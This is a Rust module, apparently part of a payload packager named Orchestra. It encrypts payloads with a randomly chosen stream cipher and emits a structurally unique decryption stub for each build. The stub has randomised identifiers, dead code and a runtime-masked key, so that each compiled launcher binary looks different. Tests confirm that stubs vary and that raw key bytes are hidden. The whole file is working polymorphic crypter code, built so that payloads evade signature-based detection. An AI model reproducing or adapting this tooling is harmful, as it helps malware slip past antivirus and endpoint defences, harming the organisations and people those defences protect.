//! Polymorphic payload wrapper for Orchestra's payload-packager.
//!
//! Each call to [`poly_wrap`] randomly selects one of three stream-cipher
//! schemes, generates a fresh key, and encrypts the payload.  The companion
//! [`poly_emit_stub`] function outputs a *structurally unique* Rust source
//! file for the decryption stub: variable names, loop forms, and dead-code
//! blocks are all randomised so each invocation produces a different binary
//! when the stub is compiled into the launcher.
//!
//! # Wire format (`poly_serialize` output)
//!
//! ```text
//! [4 bytes: magic "POLY"]
//! [1 byte:  scheme (0 = XorStream, 1 = Rc4, 2 = ChaCha20Stream)]
//! [4 bytes BE: key_len]
//! [key_len bytes: key]
//! [4 bytes BE: ciphertext_len]
//! [ciphertext_len bytes: ciphertext]
//! ```
//!
//! # Schemes
//!
//! | ID | Name        | Key size    | Notes                            |
//! |----|-------------|-------------|----------------------------------|
//! | 0  | XorStream   | 16–64 bytes | Repeating XOR                    |
//! | 1  | Rc4         | 16–256 bytes| Classic RC4 stream cipher        |
//! | 2  | ChaCha20Stream | 44 bytes   | ChaCha20 stream cipher (RFC 8439) |

use rand::Rng;

// ── Encryption scheme ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PolyScheme {
    XorStream = 0,
    Rc4 = 1,
    ChaCha20Stream = 2,  // Was LfsrStream — replaced due to M-37 8-bit leak
}

impl PolyScheme {
    fn random(rng: &mut impl Rng) -> Self {
        match rng.gen_range(0u8..3) {
            0 => Self::XorStream,
            1 => Self::Rc4,
            _ => Self::ChaCha20Stream,
        }
    }

    fn byte(self) -> u8 {
        self as u8
    }
}

// ── Blob ──────────────────────────────────────────────────────────────────────

pub struct PolyBlob {
    pub scheme: PolyScheme,
    pub key: Vec<u8>,
    pub ciphertext: Vec<u8>,
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Wrap `plaintext` with a randomly-chosen scheme and a fresh random key.
/// Every call produces different ciphertext even for the same input.
pub fn poly_wrap(plaintext: &[u8]) -> PolyBlob {
    let mut rng = rand::thread_rng();
    let scheme = PolyScheme::random(&mut rng);

    match scheme {
        PolyScheme::XorStream => {
            let key_len: usize = rng.gen_range(16..=64);
            let key: Vec<u8> = (0..key_len).map(|_| rng.gen()).collect();
            let ct = xor_stream(plaintext, &key);
            PolyBlob {
                scheme,
                key,
                ciphertext: ct,
            }
        }
        PolyScheme::Rc4 => {
            let key_len: usize = rng.gen_range(16..=256);
            let key: Vec<u8> = (0..key_len).map(|_| rng.gen()).collect();
            let ct = rc4(plaintext, &key);
            PolyBlob {
                scheme,
                key,
                ciphertext: ct,
            }
        }
        PolyScheme::ChaCha20Stream => {
            // 44 bytes: 32-byte ChaCha20 key + 12-byte nonce
            let key: Vec<u8> = (0..44).map(|_| rng.gen()).collect();
            let ct = chacha20_stream(plaintext, &key);
            PolyBlob {
                scheme,
                key,
                ciphertext: ct,
            }
        }
    }
}

/// Serialize a [`PolyBlob`] to the binary wire format documented at the top of
/// this module.
pub fn poly_serialize(blob: &PolyBlob) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + 1 + 4 + blob.key.len() + 4 + blob.ciphertext.len());
    out.extend_from_slice(b"POLY");
    out.push(blob.scheme.byte());
    out.extend_from_slice(&(blob.key.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.key);
    out.extend_from_slice(&(blob.ciphertext.len() as u32).to_be_bytes());
    out.extend_from_slice(&blob.ciphertext);
    out
}

/// Emit a unique-per-build Rust source file for the decryption stub.
///
/// The returned string is valid Rust that defines a public function:
///
/// ```rust,ignore
/// pub fn poly_decrypt(ciphertext: &[u8]) -> Vec<u8> { ... }
/// ```
///
/// The function has the key and algorithm hardcoded.  Structural elements
/// (variable names, loop style, dead-code interleavings) are randomised every
/// call so each compiled stub binary has a different binary layout.
pub fn poly_emit_stub(blob: &PolyBlob) -> String {
    let mut rng = rand::thread_rng();

    // Unique short hex token — makes every generated file visually distinct.
    let build_token: u64 = rng.gen();

    // Pre-generate all random identifiers up-front to avoid closure/borrow conflicts.
    let suf_ct = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_out = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_key = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_idx = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_klen = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let suf_dead = format!("{:04x}{:04x}", rng.gen::<u16>(), rng.gen::<u16>());
    let dead_val: u64 = rng.gen();

    let v_ct = format!("ct_{suf_ct}");
    let v_out = format!("out_{suf_out}");
    let v_key = format!("key_{suf_key}");
    let v_idx = format!("i_{suf_idx}");
    let v_klen = format!("kl_{suf_klen}");
    let v_dead = format!("_dead_{suf_dead}");

    // M-38: Avoid embedding the raw key bytes directly in source.  Mask the
    // key with a SplitMix64 stream and reconstruct it at runtime in the stub.
    let key_seed: u64 = rng.gen();
    let key_seed_lo = key_seed as u32;
    let key_seed_hi = (key_seed >> 32) as u32;
    let seed_mask_lo: u32 = rng.gen();
    let seed_mask_hi: u32 = rng.gen();
    let masked_seed_lo = key_seed_lo ^ seed_mask_lo;
    let masked_seed_hi = key_seed_hi ^ seed_mask_hi;

    let mut sm_state = key_seed;
    let masked_key: Vec<u8> = blob
        .key
        .iter()
        .map(|&b| b ^ (splitmix64_next(&mut sm_state) as u8))
        .collect();
    let masked_key_literal = byte_array_literal(&masked_key);

    let reconstruct_key_fn = emit_reconstruct_key_fn(
        &masked_key_literal,
        masked_seed_lo,
        masked_seed_hi,
        seed_mask_lo,
        seed_mask_hi,
        &mut rng,
    );

    let body = match blob.scheme {
        PolyScheme::XorStream => emit_xor_body(&v_ct, &v_key, &v_out, &v_idx, &v_klen, &mut rng),
        PolyScheme::Rc4 => emit_rc4_body(&v_ct, &v_key, &v_out, &mut rng),
        PolyScheme::ChaCha20Stream => emit_chacha20_body(&v_ct, &v_key, &v_out, &mut rng),
    };

    // Vary whether dead code appears before or after the key assignment.
    let (before_dead, after_dead) = if rng.gen_bool(0.5) {
        (
            format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"),
            String::new(),
        )
    } else {
        (
            String::new(),
            format!("    let {v_dead}: u64 = {dead_val}u64;\n    let _ = {v_dead};\n"),
        )
    };

    format!(
        "// poly_decrypt stub — generated by payload-packager --poly\n\
         // Build token: {build_token:016x}  scheme: {scheme:?}\n\
         #[allow(unused_variables, unused_mut, clippy::all, non_snake_case)]\n\
         pub fn poly_decrypt({v_ct}: &[u8]) -> ::std::vec::Vec<u8> {{\n\
         {before_dead}\
         {reconstruct_key_fn}\
         {body}\
         {after_dead}\
         }}\n",
        build_token = build_token,
        scheme = blob.scheme,
        reconstruct_key_fn = reconstruct_key_fn,
    )
}

// ── Stream cipher implementations ─────────────────────────────────────────────

/// XOR plaintext with a repeating key.
fn xor_stream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(!key.is_empty());
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

/// Classic RC4 (ARCFOUR) stream cipher.
fn rc4(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(!key.is_empty());
    let mut s: [u8; 256] = std::array::from_fn(|i| i as u8);
    let mut j: usize = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) & 0xff;
        s.swap(i, j);
    }
    let mut i = 0usize;
    j = 0;
    data.iter()
        .map(|&b| {
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff];
            b ^ k
        })
        .collect()
}

/// ChaCha20 stream cipher (RFC 8439).
///
/// Replaces the previous LFSR stream cipher (M-37), which leaked 8 bits of
/// state per output byte.  ChaCha20 is a proper stream cipher with no known
/// practical attacks.
///
/// Key: 32 bytes.  Nonce: 12 bytes (bytes 32–43 of `key`, zero-padded if shorter).
fn chacha20_stream(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(key.len() >= 32, "ChaCha20 requires at least 32 bytes of key material");

    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(16);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(12);
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(8);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(7);
        (a, b, c, d)
    }

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {
        let mut w = *state;
        for _ in 0..10 {
            let (w0,w4,w8,w12) = qr(w[0],w[4],w[8],w[12]);
            w[0]=w0; w[4]=w4; w[8]=w8; w[12]=w12;
            let (w1,w5,w9,w13) = qr(w[1],w[5],w[9],w[13]);
            w[1]=w1; w[5]=w5; w[9]=w9; w[13]=w13;
            let (w2,w6,w10,w14) = qr(w[2],w[6],w[10],w[14]);
            w[2]=w2; w[6]=w6; w[10]=w10; w[14]=w14;
            let (w3,w7,w11,w15) = qr(w[3],w[7],w[11],w[15]);
            w[3]=w3; w[7]=w7; w[11]=w11; w[15]=w15;
            let (w0,w5,w10,w15) = qr(w[0],w[5],w[10],w[15]);
            w[0]=w0; w[5]=w5; w[10]=w10; w[15]=w15;
            let (w1,w6,w11,w12) = qr(w[1],w[6],w[11],w[12]);
            w[1]=w1; w[6]=w6; w[11]=w11; w[12]=w12;
            let (w2,w7,w8,w13) = qr(w[2],w[7],w[8],w[13]);
            w[2]=w2; w[7]=w7; w[8]=w8; w[13]=w13;
            let (w3,w4,w9,w14) = qr(w[3],w[4],w[9],w[14]);
            w[3]=w3; w[4]=w4; w[9]=w9; w[14]=w14;
        }
        let mut output = [0u8; 64];
        for i in 0..16 {
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }
        output
    }

    let cipher_key = &key[..32];
    let nonce: [u8; 12] = if key.len() >= 44 {
        key[32..44].try_into().unwrap()
    } else {
        let mut n = [0u8; 12];
        let avail = key.len().saturating_sub(32).min(12);
        if avail > 0 {
            n[..avail].copy_from_slice(&key[32..32 + avail]);
        }
        n
    };

    let mut key_words = [0u32; 8];
    for i in 0..8 {
        key_words[i] = u32::from_le_bytes(cipher_key[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];

    let mut output = Vec::with_capacity(data.len());
    let mut counter: u32 = 1; // RFC 8439: counter starts at 1
    let mut keystream_pos = 64usize; // force new block on first byte
    let mut keystream = [0u8; 64];

    for &byte in data {
        if keystream_pos >= 64 {
            let state: [u32; 16] = [
                constants[0], constants[1], constants[2], constants[3],
                key_words[0], key_words[1], key_words[2], key_words[3],
                key_words[4], key_words[5], key_words[6], key_words[7],
                counter, nonce_words[0], nonce_words[1], nonce_words[2],
            ];
            keystream = chacha20_block(&state);
            keystream_pos = 0;
            counter = counter.wrapping_add(1);
        }
        output.push(byte ^ keystream[keystream_pos]);
        keystream_pos += 1;
    }

    output
}

#[inline]
fn splitmix64_next(state: &mut u64) -> u64 {
    *state = state.wrapping_add(0x9E37_79B9_7F4A_7C15);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
    z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
    z ^ (z >> 31)
}

fn emit_reconstruct_key_fn(
    masked_key_lit: &str,
    masked_seed_lo: u32,
    masked_seed_hi: u32,
    seed_mask_lo: u32,
    seed_mask_hi: u32,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let v_masked = format!("mk_{}", suf());
    let v_out = format!("rk_{}", suf());
    let v_state = format!("sm_{}", suf());
    let v_x = format!("x_{}", suf());
    let v_lo = format!("lo_{}", suf());
    let v_hi = format!("hi_{}", suf());
    let v_i = format!("i_{}", suf());

    let body = if rng.gen_bool(0.5) {
        format!(
            "    fn reconstruct_key() -> ::std::vec::Vec<u8> {{\n        \
             let {v_masked}: &[u8] = &[{masked_key_lit}];\n        \
             let {v_lo}: u32 = 0x{masked_seed_lo:08x}u32 ^ 0x{seed_mask_lo:08x}u32;\n        \
             let {v_hi}: u32 = 0x{masked_seed_hi:08x}u32 ^ 0x{seed_mask_hi:08x}u32;\n        \
             let mut {v_state}: u64 = ({v_lo} as u64) | (({v_hi} as u64) << 32);\n        \
             let mut {v_out}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_masked}.len());\n        \
             for &{v_i} in {v_masked} {{\n            \
             {v_state} = {v_state}.wrapping_add(0x9E3779B97F4A7C15u64);\n            \
             let mut {v_x} = {v_state};\n            \
             {v_x} = ({v_x} ^ ({v_x} >> 30)).wrapping_mul(0xBF58476D1CE4E5B9u64);\n            \
             {v_x} = ({v_x} ^ ({v_x} >> 27)).wrapping_mul(0x94D049BB133111EBu64);\n            \
             {v_x} ^= {v_x} >> 31;\n            \
             {v_out}.push({v_i} ^ ({v_x} as u8));\n        \
             }}\n        \
             {v_out}\n    \
             }}\n"
        )
    } else {
        format!(
            "    fn reconstruct_key() -> ::std::vec::Vec<u8> {{\n        \
             let {v_masked}: &[u8] = &[{masked_key_lit}];\n        \
             let {v_lo}: u32 = 0x{masked_seed_lo:08x}u32 ^ 0x{seed_mask_lo:08x}u32;\n        \
             let {v_hi}: u32 = 0x{masked_seed_hi:08x}u32 ^ 0x{seed_mask_hi:08x}u32;\n        \
             let mut {v_state}: u64 = ({v_lo} as u64) | (({v_hi} as u64) << 32);\n        \
             {v_masked}.iter().map(|&b| {{\n            \
             {v_state} = {v_state}.wrapping_add(0x9E3779B97F4A7C15u64);\n            \
             let mut {v_x} = {v_state};\n            \
             {v_x} = ({v_x} ^ ({v_x} >> 30)).wrapping_mul(0xBF58476D1CE4E5B9u64);\n            \
             {v_x} = ({v_x} ^ ({v_x} >> 27)).wrapping_mul(0x94D049BB133111EBu64);\n            \
             {v_x} ^= {v_x} >> 31;\n            \
             b ^ ({v_x} as u8)\n        \
             }}).collect()\n    \
             }}\n"
        )
    };

    body
}

// ── Stub body emitters ────────────────────────────────────────────────────────

fn emit_xor_body(
    v_ct: &str,
    v_key: &str,
    v_out: &str,
    v_idx: &str,
    v_klen: &str,
    rng: &mut impl Rng,
) -> String {
    if rng.gen_bool(0.5) {
        // Style A: indexed for-loop
        format!(
            "    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();\n    \
             let {v_klen} = {v_key}.len();\n    \
             let mut {v_out} = ::std::vec::Vec::with_capacity({v_ct}.len());\n    \
             for {v_idx} in 0..{v_ct}.len() {{\n        \
             {v_out}.push({v_ct}[{v_idx}] ^ {v_key}[{v_idx} % {v_klen}]);\n    \
             }}\n    \
             {v_out}\n",
        )
    } else {
        // Style B: iterator chain (no explicit loop variable)
        format!(
            "    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();\n    \
             {v_ct}.iter().enumerate()\n        \
             .map(|({v_idx}, &b)| b ^ {v_key}[{v_idx} % {v_key}.len()])\n        \
             .collect()\n",
        )
    }
}

fn emit_rc4_body(
    v_ct: &str,
    v_key: &str,
    v_out: &str,
    rng: &mut impl Rng,
) -> String {
    // Variable names for internal RC4 state
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let vs = format!("s_{}", suf());
    let vj = format!("j_{}", suf());
    let vi = format!("i_{}", suf());
    let vk = format!("k_{}", suf());
    let vb = format!("b_{}", suf());

    format!(
        "    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();\n    \
         let mut {vs}: [u8; 256] = ::std::array::from_fn(|i| i as u8);\n    \
         let mut {vj}: usize = 0;\n    \
         for {vi} in 0..256usize {{\n        \
         {vj} = ({vj} + {vs}[{vi}] as usize + {v_key}[{vi} % {v_key}.len()] as usize) & 0xff;\n        \
         {vs}.swap({vi}, {vj});\n    \
         }}\n    \
         let mut {vi}: usize = 0;\n    \
         {vj} = 0;\n    \
         let {v_out}: ::std::vec::Vec<u8> = {v_ct}.iter().map(|&{vb}| {{\n        \
         {vi} = ({vi} + 1) & 0xff;\n        \
         {vj} = ({vj} + {vs}[{vi}] as usize) & 0xff;\n        \
         {vs}.swap({vi}, {vj});\n        \
         let {vk} = {vs}[({vs}[{vi}] as usize + {vs}[{vj}] as usize) & 0xff];\n        \
         {vb} ^ {vk}\n    \
         }}).collect();\n    \
         {v_out}\n",
    )
}

fn emit_chacha20_body(
    v_ct: &str,
    v_key: &str,
    v_out: &str,
    rng: &mut impl Rng,
) -> String {
    let mut suf = || format!("{:04x}", rng.gen::<u16>());
    let v_qr     = format!("qr_{}",   suf());
    let v_block  = format!("blk_{}",  suf());
    let v_state  = format!("st_{}",   suf());
    let v_work   = format!("w_{}",    suf());
    let v_ctr    = format!("ctr_{}",  suf());
    let v_npos   = format!("npos_{}", suf());
    let v_ks     = format!("ks_{}",   suf());
    let v_b      = format!("b_{}",    suf());
    let v_kwords = format!("kw_{}",   suf());
    let v_nwords = format!("nw_{}",   suf());
    let v_consts = format!("cst_{}",  suf());

    if rng.gen_bool(0.5) {
        // Style A: inline QR operations, no helper functions
        format!(
    "    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();
    let {v_consts}: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut {v_kwords}: [u32; 8] = [0; 8];
    for i in 0..8usize {{ {v_kwords}[i] = u32::from_le_bytes({v_key}[i*4..i*4+4].try_into().unwrap()); }}
    let mut {v_nwords}: [u32; 3] = [0; 3];
    for i in 0..3usize {{ {v_nwords}[i] = u32::from_le_bytes({v_key}[32+i*4..32+i*4+4].try_into().unwrap()); }}
    let mut {v_ctr}: u32 = 1;
    let mut {v_ks}: [u8; 64] = [0; 64];
    let mut {v_npos}: usize = 64;
    let mut {v_out}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_ct}.len());
    for &{v_b} in {v_ct} {{
        if {v_npos} >= 64 {{
            let mut {v_work}: [u32; 16] = [{v_consts}[0],{v_consts}[1],{v_consts}[2],{v_consts}[3],{v_kwords}[0],{v_kwords}[1],{v_kwords}[2],{v_kwords}[3],{v_kwords}[4],{v_kwords}[5],{v_kwords}[6],{v_kwords}[7],{v_ctr},{v_nwords}[0],{v_nwords}[1],{v_nwords}[2]];
            let {v_state} = {v_work};
            for _ in 0..10 {{
                let (mut a,mut b,mut c,mut d)=({v_work}[0],{v_work}[4],{v_work}[8],{v_work}[12]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[0]=a;{v_work}[4]=b;{v_work}[8]=c;{v_work}[12]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[1],{v_work}[5],{v_work}[9],{v_work}[13]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[1]=a;{v_work}[5]=b;{v_work}[9]=c;{v_work}[13]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[2],{v_work}[6],{v_work}[10],{v_work}[14]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[2]=a;{v_work}[6]=b;{v_work}[10]=c;{v_work}[14]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[3],{v_work}[7],{v_work}[11],{v_work}[15]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[3]=a;{v_work}[7]=b;{v_work}[11]=c;{v_work}[15]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[0],{v_work}[5],{v_work}[10],{v_work}[15]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[0]=a;{v_work}[5]=b;{v_work}[10]=c;{v_work}[15]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[1],{v_work}[6],{v_work}[11],{v_work}[12]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[1]=a;{v_work}[6]=b;{v_work}[11]=c;{v_work}[12]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[2],{v_work}[7],{v_work}[8],{v_work}[13]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[2]=a;{v_work}[7]=b;{v_work}[8]=c;{v_work}[13]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[3],{v_work}[4],{v_work}[9],{v_work}[14]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[3]=a;{v_work}[4]=b;{v_work}[9]=c;{v_work}[14]=d;
            }}
            for i in 0..16usize {{ let v = {v_work}[i].wrapping_add({v_state}[i]); {v_ks}[i*4..i*4+4].copy_from_slice(&v.to_le_bytes()); }}
            {v_ctr} = {v_ctr}.wrapping_add(1);
            {v_npos} = 0;
        }}
        {v_out}.push({v_b} ^ {v_ks}[{v_npos}]);
        {v_npos} += 1;
    }}
    {v_out}
",
        )
    } else {
        // Style B: with extracted helper functions
        format!(
"    fn {v_qr}(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {{
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(16);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(12);
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(8);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(7);
        (a, b, c, d)
    }}
    fn {v_block}({v_state}: &[u32; 16]) -> [u8; 64] {{
        let mut w = *{v_state};
        for _ in 0..10 {{
            let (a,b,c,d)={v_qr}(w[0],w[4],w[8],w[12]); w[0]=a;w[4]=b;w[8]=c;w[12]=d;
            let (a,b,c,d)={v_qr}(w[1],w[5],w[9],w[13]); w[1]=a;w[5]=b;w[9]=c;w[13]=d;
            let (a,b,c,d)={v_qr}(w[2],w[6],w[10],w[14]); w[2]=a;w[6]=b;w[10]=c;w[14]=d;
            let (a,b,c,d)={v_qr}(w[3],w[7],w[11],w[15]); w[3]=a;w[7]=b;w[11]=c;w[15]=d;
            let (a,b,c,d)={v_qr}(w[0],w[5],w[10],w[15]); w[0]=a;w[5]=b;w[10]=c;w[15]=d;
            let (a,b,c,d)={v_qr}(w[1],w[6],w[11],w[12]); w[1]=a;w[6]=b;w[11]=c;w[12]=d;
            let (a,b,c,d)={v_qr}(w[2],w[7],w[8],w[13]); w[2]=a;w[7]=b;w[8]=c;w[13]=d;
            let (a,b,c,d)={v_qr}(w[3],w[4],w[9],w[14]); w[3]=a;w[4]=b;w[9]=c;w[14]=d;
        }}
        let mut out = [0u8; 64];
        for i in 0..16 {{ let v = w[i].wrapping_add({v_state}[i]); out[i*4..i*4+4].copy_from_slice(&v.to_le_bytes()); }}
        out
    }}
    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();
    let {v_consts}: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut {v_kwords}: [u32; 8] = [0; 8];
    for i in 0..8 {{ {v_kwords}[i] = u32::from_le_bytes({v_key}[i*4..i*4+4].try_into().unwrap()); }}
    let mut {v_nwords}: [u32; 3] = [0; 3];
    for i in 0..3 {{ {v_nwords}[i] = u32::from_le_bytes({v_key}[32+i*4..32+i*4+4].try_into().unwrap()); }}
    let mut {v_ctr}: u32 = 1;
    let mut {v_npos}: usize = 64;
    let mut {v_ks}: [u8; 64] = [0; 64];
    {v_ct}.iter().map(|&{v_b}| {{
        if {v_npos} >= 64 {{
            let s: [u32; 16] = [{v_consts}[0],{v_consts}[1],{v_consts}[2],{v_consts}[3],{v_kwords}[0],{v_kwords}[1],{v_kwords}[2],{v_kwords}[3],{v_kwords}[4],{v_kwords}[5],{v_kwords}[6],{v_kwords}[7],{v_ctr},{v_nwords}[0],{v_nwords}[1],{v_nwords}[2]];
            {v_ks} = {v_block}(&s);
            {v_ctr} = {v_ctr}.wrapping_add(1);
            {v_npos} = 0;
        }}
        let r = {v_b} ^ {v_ks}[{v_npos}];
        {v_npos} += 1;
        r
    }}).collect()
",
        )
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn byte_array_literal(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02x}u8", b))
        .collect::<Vec<_>>()
        .join(", ")
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_stream_roundtrip() {
        let pt = b"hello world, this is a test payload";
        let key = vec![0x42u8, 0xde, 0xad, 0xbe, 0xef];
        let ct = xor_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&xor_stream(&ct, &key), pt);
    }

    #[test]
    fn rc4_roundtrip() {
        let pt = b"orchestra polymorphic test";
        let key = b"secret-key-bytes";
        let ct = rc4(pt, key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&rc4(&ct, key), pt);
    }

    #[test]
    fn chacha20_stream_roundtrip() {
        let pt = b"chacha20 stream cipher test payload!";
        let key: Vec<u8> = (0..44).map(|i| i as u8).collect();
        let ct = chacha20_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&chacha20_stream(&ct, &key), pt);
    }

    #[test]
    fn poly_wrap_serialize_roundtrip() {
        let pt = b"full poly wrap test";
        let blob = poly_wrap(pt);
        let serialized = poly_serialize(&blob);
        assert_eq!(&serialized[..4], b"POLY");
    }

    #[test]
    fn poly_emit_stub_is_unique() {
        let blob = poly_wrap(b"variation test");
        let stub_a = poly_emit_stub(&blob);
        let stub_b = poly_emit_stub(&blob);
        // Two stubs for the same blob should differ (different variable names + build token).
        assert_ne!(stub_a, stub_b);
    }

    #[test]
    fn stub_reconstructs_key_and_hides_raw_literals() {
        let pt = b"stub key test";
        let blob = poly_wrap(pt);
        let stub = poly_emit_stub(&blob);

        // The generated source must contain runtime reconstruction.
        assert!(
            stub.contains("fn reconstruct_key() -> ::std::vec::Vec<u8>"),
            "stub missing reconstruct_key function"
        );

        // Raw key must not appear as a contiguous literal sequence.
        let full_raw_key_lit = byte_array_literal(&blob.key);
        assert!(
            !stub.contains(&full_raw_key_lit),
            "stub leaked full raw key literal"
        );

        // Allow accidental single-byte collisions, but reject any 8-byte
        // contiguous raw-key window appearing in source.
        for i in 0..=blob.key.len().saturating_sub(8) {
            let window_lit = byte_array_literal(&blob.key[i..i + 8]);
            assert!(
                !stub.contains(&window_lit),
                "stub leaked contiguous raw-key literal window starting at byte {i}"
            );
        }
    }

    #[test]
    fn masked_key_not_equal_to_real_key() {
        fn extract_literal_bytes(stub: &str) -> Vec<u8> {
            let marker = ": &[u8] = &[";
            let start = stub
                .find(marker)
                .expect("masked key literal start marker not found")
                + marker.len();
            let after_bracket = &stub[start..];
            let bracket_end = after_bracket
                .find("];")
                .expect("masked key literal end not found");
            let raw = &after_bracket[..bracket_end];
            raw.split(',')
                .map(|s| s.trim())
                .filter(|s| !s.is_empty())
                .map(|tok| {
                    let hex = tok
                        .strip_prefix("0x")
                        .and_then(|v| v.strip_suffix("u8"))
                        .expect("unexpected key byte token format");
                    u8::from_str_radix(hex, 16).expect("invalid hex key byte")
                })
                .collect()
        }

        let blob = poly_wrap(b"mask coverage test payload");
        let stub = poly_emit_stub(&blob);
        let masked = extract_literal_bytes(&stub);

        assert_eq!(masked.len(), blob.key.len(), "masked key length mismatch");

        let diff = masked
            .iter()
            .zip(blob.key.iter())
            .filter(|(a, b)| a != b)
            .count();
        assert!(
            diff * 2 >= blob.key.len(),
            "expected >=50% bytes to differ, got {diff}/{}",
            blob.key.len()
        );
    }
}
